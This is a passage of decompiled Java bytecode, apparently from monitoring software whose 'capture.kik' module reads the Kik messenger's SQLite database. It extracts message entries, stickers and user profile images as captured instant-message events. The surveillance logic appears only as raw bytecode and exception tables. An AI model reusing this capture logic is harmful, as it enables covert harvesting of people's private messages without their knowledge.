    //   1359: fconst_0
    //   1360: fstore 21
    //   1362: goto -813 -> 549
    //   1365: ldc_w 284
    //   1368: astore 34
    //   1370: aload 14
    //   1372: aload 34
    //   1374: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   1377: istore 12
    //   1379: iload 12
    //   1381: ifeq +362 -> 1743
    //   1384: new 199	java/lang/StringBuilder
    //   1387: astore 14
    //   1389: aload 14
    //   1391: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   1394: aload 14
    //   1396: aload_2
    //   1397: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1400: astore 14
    //   1402: ldc -26
    //   1404: astore 22
    //   1406: aload 14
    //   1408: aload 22
    //   1410: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1413: astore 14
    //   1415: aload 14
    //   1417: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1420: astore 11
    //   1422: aload_3
    //   1423: invokestatic 159	com/vvt/capture/kik/removeFromPath:a	(Ljava/lang/String;)Ljava/lang/String;
    //   1426: astore 14
    //   1428: aload 14
    //   1430: aload 24
    //   1432: aload 11
    //   1434: invokestatic 162	com/vvt/n/a/MyUncaughtExceptionHandler/a:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   1437: astore 40
    //   1439: iconst_3
    //   1440: istore 12
    //   1442: ldc -76
    //   1444: fstore 13
    //   1446: getstatic 103	com/vvt/im/events/MessageType:none	Lcom/vvt/im/events/MessageType;
    //   1449: astore 22
    //   1451: aload 22
    //   1453: invokevirtual 107	com/vvt/im/events/MessageType:getNumber	()I
    //   1456: istore 20
    //   1458: iload 12
    //   1460: istore 37
    //   1462: aload 11
    //   1464: astore 14
    //   1466: aload 40
    //   1468: astore 11
    //   1470: iload 20
    //   1472: istore 23
    //   1474: iconst_0
    //   1475: istore 20
    //   1477: aconst_null
    //   1478: astore 22
    //   1480: fconst_0
    //   1481: fstore 21
    //   1483: iload 12
    //   1485: istore 8
    //   1487: goto -938 -> 549
    //   1490: iconst_1
    //   1491: istore 10
    //   1493: iload 8
    //   1495: iload 10
    //   1497: if_icmpne +62 -> 1559
    //   1500: new 199	java/lang/StringBuilder
    //   1503: astore 14
    //   1505: aload 14
    //   1507: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   1510: aload 14
    //   1512: aload 28
    //   1514: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1517: astore 14
    //   1519: ldc_w 286
    //   1522: astore 9
    //   1524: aload 14
    //   1526: aload 9
    //   1528: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1531: astore 14
    //   1533: aload 14
    //   1535: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1538: astore 14
    //   1540: aload 22
    //   1542: astore 9
    //   1544: aload 19
    //   1546: astore 39
    //   1548: aload 14
    //   1550: astore 19
    //   1552: aload 39
    //   1554: astore 14
    //   1556: goto -775 -> 781
    //   1559: getstatic 272	com/vvt/im/events/MessageType:Sticker	Lcom/vvt/im/events/MessageType;
    //   1562: astore 9
    //   1564: aload 9
    //   1566: invokevirtual 107	com/vvt/im/events/MessageType:getNumber	()I
    //   1569: istore 8
    //   1571: iload 23
    //   1573: iload 8
    //   1575: if_icmpne +149 -> 1724
    //   1578: new 199	java/lang/StringBuilder
    //   1581: astore 14
    //   1583: aload 14
    //   1585: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   1588: aload 14
    //   1590: aload 28
    //   1592: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1595: astore 14
    //   1597: ldc_w 288
    //   1600: astore 9
    //   1602: aload 14
    //   1604: aload 9
    //   1606: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1609: astore 14
    //   1611: aload 14
    //   1613: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1616: astore 14
    //   1618: aload 22
    //   1620: astore 9
    //   1622: aload 19
    //   1624: astore 39
    //   1626: aload 14
    //   1628: astore 19
    //   1630: aload 39
    //   1632: astore 14
    //   1634: goto -853 -> 781
    //   1637: aload 11
    //   1639: invokevirtual 291	java/io/File:delete	()Z
    //   1642: pop
    //   1643: goto -828 -> 815
    //   1646: astore 14
    //   1648: aload 17
    //   1650: astore 14
    //   1652: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   1655: istore 8
    //   1657: iload 8
    //   1659: ifeq +3 -> 1662
    //   1662: aload 14
    //   1664: ifnull -837 -> 827
    //   1667: aload 14
    //   1669: invokeinterface 74 1 0
    //   1674: goto -847 -> 827
    //   1677: astore 9
    //   1679: aconst_null
    //   1680: astore 17
    //   1682: aload 9
    //   1684: astore 14
    //   1686: aload 17
    //   1688: ifnull +10 -> 1698
    //   1691: aload 17
    //   1693: invokeinterface 74 1 0
    //   1698: aload 14
    //   1700: athrow
    //   1701: astore 14
    //   1703: goto -17 -> 1686
    //   1706: astore 9
    //   1708: aload 14
    //   1710: astore 17
    //   1712: aload 9
    //   1714: astore 14
    //   1716: goto -30 -> 1686
    //   1719: astore 9
    //   1721: goto -69 -> 1652
    //   1724: aload 22
    //   1726: astore 9
    //   1728: aload 19
    //   1730: astore 39
    //   1732: aload 14
    //   1734: astore 19
    //   1736: aload 39
    //   1738: astore 14
    //   1740: goto -959 -> 781
    //   1743: iconst_0
    //   1744: istore 12
    //   1746: aconst_null
    //   1747: astore 14
    //   1749: fconst_0
    //   1750: fstore 13
    //   1752: iconst_0
    //   1753: istore 37
    //   1755: aconst_null
    //   1756: astore 39
    //   1758: iload 20
    //   1760: istore 8
    //   1762: iconst_0
    //   1763: istore 20
    //   1765: aconst_null
    //   1766: astore 22
    //   1768: fconst_0
    //   1769: fstore 21
    //   1771: goto -1222 -> 549
    //   1774: iconst_0
    //   1775: istore 12
    //   1777: aconst_null
    //   1778: astore 14
    //   1780: fconst_0
    //   1781: fstore 13
    //   1783: goto -1246 -> 537
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1786	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	1786	1	paramKikData	KikData
    //   0	1786	2	paramString1	String
    //   0	1786	3	paramString2	String
    //   0	1786	4	paramb	com.vvt.base.removeFromPath
    //   3	835	5	locala	com.vvt.im.events.info.a
    //   11	705	6	bool1	boolean
    //   14	1326	7	str1	String
    //   17	1559	8	i	int
    //   1655	106	8	bool2	boolean
    //   20	1601	9	localObject1	Object
    //   1677	6	9	localObject2	Object
    //   1706	7	9	localObject3	Object
    //   1719	1	9	localException1	Exception
    //   1726	1	9	localObject4	Object
    //   23	648	10	bool3	boolean
    //   721	777	10	j	int
    //   26	1612	11	localObject5	Object
    //   29	73	12	bool4	boolean
    //   142	5	12	k	int
    //   384	696	12	bool5	boolean
    //   1155	24	12	m	int
    //   1377	3	12	bool6	boolean
    //   1440	336	12	n	int
    //   32	1750	13	f1	float
    //   35	1598	14	localObject6	Object
    //   1646	1	14	localException2	Exception
    //   1650	49	14	localObject7	Object
    //   1701	8	14	localObject8	Object
    //   1714	65	14	localObject9	Object
    //   39	376	15	l1	long
    //   42	1669	17	localObject10	Object
    //   54	3	18	i1	int
    //   61	1674	19	localObject11	Object
    //   64	1700	20	i2	int
    //   67	1703	21	f2	float
    //   70	1697	22	localObject12	Object
    //   127	1449	23	i3	int
    //   157	1274	24	str2	String
    //   160	3	25	i4	int
    //   167	903	26	localObject13	Object
    //   170	25	27	i5	int
    //   173	1418	28	localObject14	Object
    //   177	106	29	str3	String
    //   251	39	30	bool7	boolean
    //   328	15	31	bool8	boolean
    //   448	3	32	bool9	boolean
    //   470	54	32	i6	int
    //   851	96	32	bool10	boolean
    //   1011	54	32	i7	int
    //   1114	94	32	bool11	boolean
    //   473	592	33	i8	int
    //   486	887	34	localObject15	Object
    //   566	133	35	l2	long
    //   902	852	37	i9	int
    //   919	258	38	localObject16	Object
    //   1089	668	39	localObject17	Object
    //   1143	324	40	str4	String
    //   1306	5	41	str5	String
    // Exception table:
    //   from	to	target	type
    //   92	99	1646	java/lang/Exception
    //   117	120	1646	java/lang/Exception
    //   122	127	1646	java/lang/Exception
    //   135	142	1646	java/lang/Exception
    //   146	153	1646	java/lang/Exception
    //   162	167	1646	java/lang/Exception
    //   182	185	1646	java/lang/Exception
    //   196	199	1646	java/lang/Exception
    //   201	206	1646	java/lang/Exception
    //   208	211	1646	java/lang/Exception
    //   213	216	1646	java/lang/Exception
    //   221	226	1646	java/lang/Exception
    //   228	231	1646	java/lang/Exception
    //   233	238	1646	java/lang/Exception
    //   246	251	1646	java/lang/Exception
    //   264	269	1646	java/lang/Exception
    //   282	287	1646	java/lang/Exception
    //   295	299	1646	java/lang/Exception
    //   301	305	1646	java/lang/Exception
    //   311	316	1646	java/lang/Exception
    //   319	323	1646	java/lang/Exception
    //   325	328	1646	java/lang/Exception
    //   335	340	1646	java/lang/Exception
    //   347	352	1646	java/lang/Exception
    //   354	359	1646	java/lang/Exception
    //   362	366	1646	java/lang/Exception
    //   379	384	1646	java/lang/Exception
    //   398	403	1646	java/lang/Exception
    //   414	419	1646	java/lang/Exception
    //   421	426	1646	java/lang/Exception
    //   426	429	1646	java/lang/Exception
    //   437	441	1646	java/lang/Exception
    //   443	448	1646	java/lang/Exception
    //   455	460	1646	java/lang/Exception
    //   467	470	1646	java/lang/Exception
    //   490	492	1646	java/lang/Exception
    //   510	513	1646	java/lang/Exception
    //   530	535	1646	java/lang/Exception
    //   549	554	1646	java/lang/Exception
    //   561	566	1646	java/lang/Exception
    //   572	577	1646	java/lang/Exception
    //   579	584	1646	java/lang/Exception
    //   584	587	1646	java/lang/Exception
    //   594	597	1646	java/lang/Exception
    //   599	604	1646	java/lang/Exception
    //   606	611	1646	java/lang/Exception
    //   613	616	1646	java/lang/Exception
    //   620	625	1646	java/lang/Exception
    //   629	634	1646	java/lang/Exception
    //   636	641	1646	java/lang/Exception
    //   643	648	1646	java/lang/Exception
    //   657	663	1646	java/lang/Exception
    //   663	668	1646	java/lang/Exception
    //   675	678	1646	java/lang/Exception
    //   682	687	1646	java/lang/Exception
    //   687	692	1646	java/lang/Exception
    //   698	703	1646	java/lang/Exception
    //   705	710	1646	java/lang/Exception
    //   710	713	1646	java/lang/Exception
    //   730	733	1646	java/lang/Exception
    //   735	740	1646	java/lang/Exception
    //   742	747	1646	java/lang/Exception
    //   755	760	1646	java/lang/Exception
    //   762	767	1646	java/lang/Exception
    //   774	779	1646	java/lang/Exception
    //   783	788	1646	java/lang/Exception
    //   790	795	1646	java/lang/Exception
    //   797	802	1646	java/lang/Exception
    //   804	809	1646	java/lang/Exception
    //   810	815	1646	java/lang/Exception
    //   846	851	1646	java/lang/Exception
    //   864	869	1646	java/lang/Exception
    //   877	881	1646	java/lang/Exception
    //   883	887	1646	java/lang/Exception
    //   893	898	1646	java/lang/Exception
    //   939	944	1646	java/lang/Exception
    //   952	956	1646	java/lang/Exception
    //   963	966	1646	java/lang/Exception
    //   970	975	1646	java/lang/Exception
    //   982	987	1646	java/lang/Exception
    //   989	994	1646	java/lang/Exception
    //   996	1001	1646	java/lang/Exception
    //   1008	1011	1646	java/lang/Exception
    //   1031	1033	1646	java/lang/Exception
    //   1051	1054	1646	java/lang/Exception
    //   1071	1076	1646	java/lang/Exception
    //   1109	1114	1646	java/lang/Exception
    //   1122	1126	1646	java/lang/Exception
    //   1128	1132	1646	java/lang/Exception
    //   1138	1143	1646	java/lang/Exception
    //   1145	1148	1646	java/lang/Exception
    //   1150	1155	1646	java/lang/Exception
    //   1200	1205	1646	java/lang/Exception
    //   1213	1217	1646	java/lang/Exception
    //   1219	1223	1646	java/lang/Exception
    //   1229	1234	1646	java/lang/Exception
    //   1236	1239	1646	java/lang/Exception
    //   1241	1246	1646	java/lang/Exception
    //   1249	1253	1646	java/lang/Exception
    //   1260	1263	1646	java/lang/Exception
    //   1267	1272	1646	java/lang/Exception
    //   1279	1284	1646	java/lang/Exception
    //   1286	1291	1646	java/lang/Exception
    //   1293	1296	1646	java/lang/Exception
    //   1298	1303	1646	java/lang/Exception
    //   1310	1315	1646	java/lang/Exception
    //   1319	1324	1646	java/lang/Exception
    //   1326	1331	1646	java/lang/Exception
    //   1334	1339	1646	java/lang/Exception
    //   1372	1377	1646	java/lang/Exception
    //   1384	1387	1646	java/lang/Exception
    //   1389	1394	1646	java/lang/Exception
    //   1396	1400	1646	java/lang/Exception
    //   1408	1413	1646	java/lang/Exception
    //   1415	1420	1646	java/lang/Exception
    //   1422	1426	1646	java/lang/Exception
    //   1432	1437	1646	java/lang/Exception
    //   1446	1449	1646	java/lang/Exception
    //   1451	1456	1646	java/lang/Exception
    //   1500	1503	1646	java/lang/Exception
    //   1505	1510	1646	java/lang/Exception
    //   1512	1517	1646	java/lang/Exception
    //   1526	1531	1646	java/lang/Exception
    //   1533	1538	1646	java/lang/Exception
    //   1559	1562	1646	java/lang/Exception
    //   1564	1569	1646	java/lang/Exception
    //   1578	1581	1646	java/lang/Exception
    //   1583	1588	1646	java/lang/Exception
    //   1590	1595	1646	java/lang/Exception
    //   1604	1609	1646	java/lang/Exception
    //   1611	1616	1646	java/lang/Exception
    //   1637	1643	1646	java/lang/Exception
    //   48	51	1677	finally
    //   56	61	1677	finally
    //   75	77	1677	finally
    //   80	85	1677	finally
    //   92	99	1701	finally
    //   117	120	1701	finally
    //   122	127	1701	finally
    //   135	142	1701	finally
    //   146	153	1701	finally
    //   162	167	1701	finally
    //   182	185	1701	finally
    //   196	199	1701	finally
    //   201	206	1701	finally
    //   208	211	1701	finally
    //   213	216	1701	finally
    //   221	226	1701	finally
    //   228	231	1701	finally
    //   233	238	1701	finally
    //   246	251	1701	finally
    //   264	269	1701	finally
    //   282	287	1701	finally
    //   295	299	1701	finally
    //   301	305	1701	finally
    //   311	316	1701	finally
    //   319	323	1701	finally
    //   325	328	1701	finally
    //   335	340	1701	finally
    //   347	352	1701	finally
    //   354	359	1701	finally
    //   362	366	1701	finally
    //   379	384	1701	finally
    //   398	403	1701	finally
    //   414	419	1701	finally
    //   421	426	1701	finally
    //   426	429	1701	finally
    //   437	441	1701	finally
    //   443	448	1701	finally
    //   455	460	1701	finally
    //   467	470	1701	finally
    //   490	492	1701	finally
    //   510	513	1701	finally
    //   530	535	1701	finally
    //   549	554	1701	finally
    //   561	566	1701	finally
    //   572	577	1701	finally
    //   579	584	1701	finally
    //   584	587	1701	finally
    //   594	597	1701	finally
    //   599	604	1701	finally
    //   606	611	1701	finally
    //   613	616	1701	finally
    //   620	625	1701	finally
    //   629	634	1701	finally
    //   636	641	1701	finally
    //   643	648	1701	finally
    //   657	663	1701	finally
    //   663	668	1701	finally
    //   675	678	1701	finally
    //   682	687	1701	finally
    //   687	692	1701	finally
    //   698	703	1701	finally
    //   705	710	1701	finally
    //   710	713	1701	finally
    //   730	733	1701	finally
    //   735	740	1701	finally
    //   742	747	1701	finally
    //   755	760	1701	finally
    //   762	767	1701	finally
    //   774	779	1701	finally
    //   783	788	1701	finally
    //   790	795	1701	finally
    //   797	802	1701	finally
    //   804	809	1701	finally
    //   810	815	1701	finally
    //   846	851	1701	finally
    //   864	869	1701	finally
    //   877	881	1701	finally
    //   883	887	1701	finally
    //   893	898	1701	finally
    //   939	944	1701	finally
    //   952	956	1701	finally
    //   963	966	1701	finally
    //   970	975	1701	finally
    //   982	987	1701	finally
    //   989	994	1701	finally
    //   996	1001	1701	finally
    //   1008	1011	1701	finally
    //   1031	1033	1701	finally
    //   1051	1054	1701	finally
    //   1071	1076	1701	finally
    //   1109	1114	1701	finally
    //   1122	1126	1701	finally
    //   1128	1132	1701	finally
    //   1138	1143	1701	finally
    //   1145	1148	1701	finally
    //   1150	1155	1701	finally
    //   1200	1205	1701	finally
    //   1213	1217	1701	finally
    //   1219	1223	1701	finally
    //   1229	1234	1701	finally
    //   1236	1239	1701	finally
    //   1241	1246	1701	finally
    //   1249	1253	1701	finally
    //   1260	1263	1701	finally
    //   1267	1272	1701	finally
    //   1279	1284	1701	finally
    //   1286	1291	1701	finally
    //   1293	1296	1701	finally
    //   1298	1303	1701	finally
    //   1310	1315	1701	finally
    //   1319	1324	1701	finally
    //   1326	1331	1701	finally
    //   1334	1339	1701	finally
    //   1372	1377	1701	finally
    //   1384	1387	1701	finally
    //   1389	1394	1701	finally
    //   1396	1400	1701	finally
    //   1408	1413	1701	finally
    //   1415	1420	1701	finally
    //   1422	1426	1701	finally
    //   1432	1437	1701	finally
    //   1446	1449	1701	finally
    //   1451	1456	1701	finally
    //   1500	1503	1701	finally
    //   1505	1510	1701	finally
    //   1512	1517	1701	finally
    //   1526	1531	1701	finally
    //   1533	1538	1701	finally
    //   1559	1562	1701	finally
    //   1564	1569	1701	finally
    //   1578	1581	1701	finally
    //   1583	1588	1701	finally
    //   1590	1595	1701	finally
    //   1604	1609	1701	finally
    //   1611	1616	1701	finally
    //   1637	1643	1701	finally
    //   1652	1655	1706	finally
    //   48	51	1719	java/lang/Exception
    //   56	61	1719	java/lang/Exception
    //   75	77	1719	java/lang/Exception
    //   80	85	1719	java/lang/Exception
  }
  
  /* Error */
  private static com.vvt.im.events.info.e a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: iconst_0
    //   3: istore 4
    //   5: aconst_null
    //   6: astore 5
    //   8: iconst_0
    //   9: newarray <illegal type>
    //   11: astore 6
    //   13: invokestatic 292	com/vvt/capture/kik/removeFromPath:f	()Ljava/lang/String;
    //   16: astore 6
    //   18: iconst_1
    //   19: istore 7
    //   21: iload 7
    //   23: anewarray 88	java/lang/String
    //   26: astore 8
    //   28: iconst_0
    //   29: istore 9
    //   31: aconst_null
    //   32: astore 10
    //   34: aload 8
    //   36: iconst_0
    //   37: aload_1
    //   38: aastore
    //   39: aload_0
    //   40: aload 6
    //   42: aload 8
    //   44: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   47: astore 8
    //   49: aload 8
    //   51: invokeinterface 95 1 0
    //   56: istore_3
    //   57: iload_3
    //   58: ifeq +313 -> 371
    //   61: ldc_w 294
    //   64: astore 6
    //   66: aload 8
    //   68: aload 6
    //   70: invokeinterface 66 2 0
    //   75: istore_3
    //   76: aload 8
    //   78: iload_3
    //   79: invokeinterface 112 2 0
    //   84: astore 11
    //   86: ldc_w 296
    //   89: astore 6
    //   91: aload 8
    //   93: aload 6
    //   95: invokeinterface 66 2 0
    //   100: istore_3
    //   101: aload 8
    //   103: iload_3
    //   104: invokeinterface 112 2 0
    //   109: astore 12
    //   111: ldc_w 298
    //   114: astore 6
    //   116: aload 8
    //   118: aload 6
    //   120: invokeinterface 66 2 0
    //   125: istore_3
    //   126: aload 8
    //   128: iload_3
    //   129: invokeinterface 112 2 0
    //   134: astore 6
    //   136: aload 6
    //   138: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   141: istore 9
    //   143: iload 9
    //   145: ifne +336 -> 481
    //   148: ldc_w 300
    //   151: astore 10
    //   153: aload 6
    //   155: aload 10
    //   157: invokevirtual 303	java/lang/String:endsWith	(Ljava/lang/String;)Z
    //   160: istore 9
    //   162: iload 9
    //   164: ifne +43 -> 207
    //   167: new 199	java/lang/StringBuilder
    //   170: astore 10
    //   172: aload 10
    //   174: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   177: aload 10
    //   179: aload 6
    //   181: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   184: astore 6
    //   186: ldc_w 300
    //   189: astore 10
    //   191: aload 6
    //   193: aload 10
    //   195: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   198: astore 6
    //   200: aload 6
    //   202: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   205: astore 6
    //   207: new 199	java/lang/StringBuilder
    //   210: astore 10
    //   212: aload 10
    //   214: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   217: aload 10
    //   219: aload 6
    //   221: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   224: astore 6
    //   226: ldc_w 305
    //   229: astore 10
    //   231: aload 6
    //   233: aload 10
    //   235: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   238: astore 6
    //   240: aload 6
    //   242: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   245: astore 6
    //   247: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   250: istore 9
    //   252: iload 9
    //   254: ifeq +3 -> 257
    //   257: aload 6
    //   259: invokestatic 188	com/vvt/capture/kik/removeFromPath:e	(Ljava/lang/String;)[B
    //   262: astore 6
    //   264: aload 6
    //   266: ifnull +215 -> 481
    //   269: aload 6
    //   271: arraylength
    //   272: istore 9
    //   274: iload 9
    //   276: ifle +205 -> 481
    //   279: getstatic 129	com/vvt/im/events/ImType:KIK	Lcom/vvt/im/events/ImType;
    //   282: astore 10
    //   284: getstatic 308	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   287: astore 13
    //   289: aload_2
    //   290: aload 10
    //   292: aload 13
    //   294: invokestatic 140	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   297: astore 10
    //   299: getstatic 308	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   302: astore 13
    //   304: aload 13
    //   306: invokestatic 143	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   309: astore 13
    //   311: aload 6
    //   313: aload 10
    //   315: aload 13
    //   317: invokestatic 195	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   320: astore 6
    //   322: aload 6
    //   324: astore 10
    //   326: new 310	com/vvt/im/events/info/e
    //   329: astore 6
    //   331: aload 6
    //   333: invokespecial 311	com/vvt/im/events/info/e:<init>	()V
    //   336: aload 6
    //   338: aload 12
    //   340: invokevirtual 312	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
    //   343: aload 6
    //   345: aload 11
    //   347: invokevirtual 313	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   350: aload 6
    //   352: aload 10
    //   354: invokevirtual 314	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
    //   357: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   360: istore 4
    //   362: iload 4
    //   364: ifeq +3 -> 367
    //   367: aload 6
    //   369: astore 5
    //   371: aload 8
    //   373: ifnull +10 -> 383
    //   376: aload 8
    //   378: invokeinterface 74 1 0
    //   383: aload 5
    //   385: areturn
    //   386: astore 6
    //   388: iconst_0
    //   389: istore_3
    //   390: aconst_null
    //   391: astore 6
    //   393: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   396: istore 7
    //   398: iload 7
    //   400: ifeq +3 -> 403
    //   403: aload 6
    //   405: ifnull -22 -> 383
    //   408: aload 6
    //   410: invokeinterface 74 1 0
    //   415: goto -32 -> 383
    //   418: astore 6
    //   420: iconst_0
    //   421: istore 7
    //   423: aconst_null
    //   424: astore 8
    //   426: aload 6
    //   428: astore 5
    //   430: aload 8
    //   432: ifnull +10 -> 442
    //   435: aload 8
    //   437: invokeinterface 74 1 0
    //   442: aload 5
    //   444: athrow
    //   445: astore 5
    //   447: goto -17 -> 430
    //   450: astore 5
    //   452: aload 6
    //   454: astore 8
    //   456: goto -26 -> 430
    //   459: astore 6
    //   461: aload 8
    //   463: astore 6
    //   465: goto -72 -> 393
    //   468: astore 5
    //   470: aload 6
    //   472: astore 5
    //   474: aload 8
    //   476: astore 6
    //   478: goto -85 -> 393
    //   481: iconst_0
    //   482: istore 9
    //   484: aconst_null
    //   485: astore 10
    //   487: goto -161 -> 326
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	490	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	490	1	paramString1	String
    //   0	490	2	paramString2	String
    //   1	57	3	bool1	boolean
    //   75	315	3	i	int
    //   3	360	4	bool2	boolean
    //   6	437	5	localObject1	Object
    //   445	1	5	localObject2	Object
    //   450	1	5	localObject3	Object
    //   468	1	5	localException1	Exception
    //   472	1	5	localObject4	Object
    //   11	357	6	localObject5	Object
    //   386	1	6	localException2	Exception
    //   391	18	6	localObject6	Object
    //   418	35	6	localObject7	Object
    //   459	1	6	localException3	Exception
    //   463	14	6	localObject8	Object
    //   19	403	7	bool3	boolean
    //   26	449	8	localObject9	Object
    //   29	224	9	bool4	boolean
    //   272	211	9	j	int
    //   32	454	10	localObject10	Object
    //   84	262	11	str1	String
    //   109	230	12	str2	String
    //   287	29	13	localObject11	Object
    // Exception table:
    //   from	to	target	type
    //   13	16	386	java/lang/Exception
    //   21	26	386	java/lang/Exception
    //   37	39	386	java/lang/Exception
    //   42	47	386	java/lang/Exception
    //   13	16	418	finally
    //   21	26	418	finally
    //   37	39	418	finally
    //   42	47	418	finally
    //   49	56	445	finally
    //   68	75	445	finally
    //   78	84	445	finally
    //   93	100	445	finally
    //   103	109	445	finally
    //   118	125	445	finally
    //   128	134	445	finally
    //   136	141	445	finally
    //   155	160	445	finally
    //   167	170	445	finally
    //   172	177	445	finally
    //   179	184	445	finally
    //   193	198	445	finally
    //   200	205	445	finally
    //   207	210	445	finally
    //   212	217	445	finally
    //   219	224	445	finally
    //   233	238	445	finally
    //   240	245	445	finally
    //   247	250	445	finally
    //   257	262	445	finally
    //   269	272	445	finally
    //   279	282	445	finally
    //   284	287	445	finally
    //   292	297	445	finally
    //   299	302	445	finally
    //   304	309	445	finally
    //   315	320	445	finally
    //   326	329	445	finally
    //   331	336	445	finally
    //   338	343	445	finally
    //   345	350	445	finally
    //   352	357	445	finally
    //   357	360	445	finally
    //   393	396	450	finally
    //   49	56	459	java/lang/Exception
    //   68	75	459	java/lang/Exception
    //   78	84	459	java/lang/Exception
    //   93	100	459	java/lang/Exception
    //   103	109	459	java/lang/Exception
    //   118	125	459	java/lang/Exception
    //   128	134	459	java/lang/Exception
    //   136	141	459	java/lang/Exception
    //   155	160	459	java/lang/Exception
    //   167	170	459	java/lang/Exception
    //   172	177	459	java/lang/Exception
    //   179	184	459	java/lang/Exception
    //   193	198	459	java/lang/Exception
    //   200	205	459	java/lang/Exception
    //   207	210	459	java/lang/Exception
    //   212	217	459	java/lang/Exception
    //   219	224	459	java/lang/Exception
    //   233	238	459	java/lang/Exception
    //   240	245	459	java/lang/Exception
    //   247	250	459	java/lang/Exception
    //   257	262	459	java/lang/Exception
    //   269	272	459	java/lang/Exception
    //   279	282	459	java/lang/Exception
    //   284	287	459	java/lang/Exception
    //   292	297	459	java/lang/Exception
    //   299	302	459	java/lang/Exception
    //   304	309	459	java/lang/Exception
    //   315	320	459	java/lang/Exception
    //   326	329	459	java/lang/Exception
    //   331	336	459	java/lang/Exception
    //   338	343	468	java/lang/Exception
    //   345	350	468	java/lang/Exception
    //   352	357	468	java/lang/Exception
    //   357	360	468	java/lang/Exception
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: invokestatic 316	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   5: astore_3
    //   6: iconst_1
    //   7: istore 4
    //   9: iload 4
    //   11: anewarray 88	java/lang/String
    //   14: astore 5
    //   16: aload 5
    //   18: iconst_0
    //   19: aload_1
    //   20: aastore
    //   21: aload_0
    //   22: aload_3
    //   23: aload 5
    //   25: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   28: astore_3
    //   29: aload_3
    //   30: invokeinterface 95 1 0
    //   35: istore 4
    //   37: iload 4
    //   39: ifeq +27 -> 66
    //   42: ldc_w 294
    //   45: astore 5
    //   47: aload_3
    //   48: aload 5
    //   50: invokeinterface 66 2 0
    //   55: istore 4
    //   57: aload_3
    //   58: iload 4
    //   60: invokeinterface 112 2 0
    //   65: astore_2
    //   66: aload_3
    //   67: ifnull +9 -> 76
    //   70: aload_3
    //   71: invokeinterface 74 1 0
    //   76: aload_2
    //   77: areturn
    //   78: astore_3
    //   79: aconst_null
    //   80: astore_3
    //   81: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   84: istore 4
    //   86: iload 4
    //   88: ifeq +3 -> 91
    //   91: aload_3
    //   92: ifnull -16 -> 76
    //   95: goto -25 -> 70
    //   98: astore 6
    //   100: aconst_null
    //   101: astore_3
    //   102: aload 6
    //   104: astore_2
    //   105: aload_3
    //   106: ifnull +9 -> 115
    //   109: aload_3
    //   110: invokeinterface 74 1 0
    //   115: aload_2
    //   116: athrow
    //   117: astore_2
    //   118: goto -13 -> 105
    //   121: astore 5
    //   123: goto -42 -> 81
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	126	0	paramSQLiteDatabase	SQLiteDatabase
